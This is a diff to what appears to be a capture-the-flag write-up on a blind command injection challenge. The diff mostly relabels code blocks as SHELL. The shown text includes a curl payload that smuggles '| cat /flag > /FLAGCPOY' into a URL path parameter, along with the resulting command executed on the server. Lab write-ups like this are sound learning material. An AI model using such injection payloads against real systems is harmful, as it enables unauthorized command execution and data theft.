@@ -39,10 +39,9 @@ def challenge():
 
 ince this is blind, we can’t see the output of our payload. But we can cause side effects — like writing the contents of `/flag` to a file we can inspect.
 
-
 ### Working Payload
 
-```
+```SHELL
 curl "http://challenge.localhost:80/dare?path=/challenge%20|%20cat%20/flag%20>%20/FLAGCPOY"
 ```
 ![alt text](image-2.png)
@@ -55,7 +54,7 @@ curl "http://challenge.localhost:80/dare?path=/challenge%20|%20cat%20/flag%20>%2
 
 Final command executed:
 
-```
+```SHELL
 touch /challenge | cat /flag > /FLAGCPOY
 ```
 
@@ -63,6 +62,6 @@ touch /challenge | cat /flag > /FLAGCPOY
 
 Now that the flag is stored in `/FLAGCPOY`, simply run:
 
-```
+```SHELL
 cat /FLAGCPOY
 ```
